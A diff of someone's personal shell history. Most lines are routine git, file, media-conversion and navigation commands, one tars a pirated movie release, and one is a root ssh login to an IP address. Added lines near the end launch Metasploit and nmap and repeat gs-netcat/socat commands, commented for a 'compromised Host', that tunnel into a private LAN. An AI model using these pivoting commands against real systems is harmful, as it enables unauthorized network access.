@@ -1,57 +1,3 @@
-gh repo create
-ls
-mv api dist package.json  tsconfig.json  client
-ls
-cd client
-git init 
-git add .
-git commit -m new
-git push -u origin main
-ls
-vi README.md 
-ls
-cd
-server
-zsh
-ls
-cd vanilla/
-server 3001
-ls
-cls
-ls
-bash
-cls
-zsh
-kill node
-pkill node
-targz The.Rocky.Horror.Picture.Show.1975.1080p.BluRay.H264.AAC-RARBG
-targz The.Rocky.Horror.Picture.Show.1975.1080p.BluRay.H264.AAC-RARBG.mp4
-ls
-pkgz
-pkg 
-tar
-tar -h
-tar -c The.Rocky.Horror.Picture.Show.1975.1080p.BluRay.H264.AAC-RARBG.mp4
-ls
-cls
-projects
-ls
-cd
-ls
-zsh
-ssh root@
-ssh root@137.184.126.173
-yt-dl https://youtu.be/fxJsL1RVrvE?si=hNA5IMnPip0A4rhx
-youtube-dl https://youtu.be/fxJsL1RVrvE?si=hNA5IMnPip0A4rhx
-ls
-open Quake\ 3\ Arena\ Excellent\ sound-fxJsL1RVrvE.mp4 
-ffmpeg Quake\ 3\ Arena\ Excellent\ sound-fxJsL1RVrvE.mp4 Excellent.wav
-ffmpeg Quake\ 3\ Arena\ Excellent\ sound-fxJsL1RVrvE.mp4 --format .wav
-ls
-ffmpeg Quake\ 3\ Arena\ Excellent\ sound-fxJsL1RVrvE.mp4 Excellent.mp4 -f .wav
-ffmpeg Quake\ 3\ Arena\ Excellent\ sound-fxJsL1RVrvE.mp4 Excellent.mp4 -f .wav -o quake.wav
-ls
-ls
 cd
 zsh
 cd sms
@@ -498,3 +444,57 @@ func
 fn
 function
 zsh
+zsh
+zsh
+ls
+info
+msf
+exit
+fink localdirs
+fink install localdirs
+ls
+fink
+ls
+whicn nmap
+which nmap
+ls
+brew cleanup
+nmap 
+which nmap
+ls
+lsgs-netcat -p 1080    # Your workstation.
+# Access route.local:22 on the Host's private LAN from your Workstation:
+socat -  "SOCKS4a:127.1:route.local:22"
+ls
+gs-netcat -p 1080    # Your workstation.
+# Access route.local:22 on the Host's private LAN from your Workstation:
+socat -  "SOCKS4a:127.1:route.local:22"
+sudo gs-netcat -p 1080    # Your workstation.
+# Access route.local:22 on the Host's private LAN from your Workstation:
+socat -  "SOCKS4a:127.1:route.local:22"
+gs-netcat -l -S       # compromised Host
+gs-netcat -l -S      
+socat -  "SOCKS4a:127.1:route.local:22"
+socat -  "SOCKS4a:127.1:route.local:5000"
+socat -  "SOCKS4a:127.1:route.local:22"
+socat -  "SOCKS4a:127.1:route.local:22"
+gs-netcat -l -S       # compromised Host
+gs-netcat -p 1080    # Your workstation.
+ls
+cd ..
+ls
+cd
+ls
+ls
+cd ..
+ls
+cd ..
+ls
+cd ..
+ls
+cd ..
+cd ..
+cd ..
+ls
+cd /
+ls
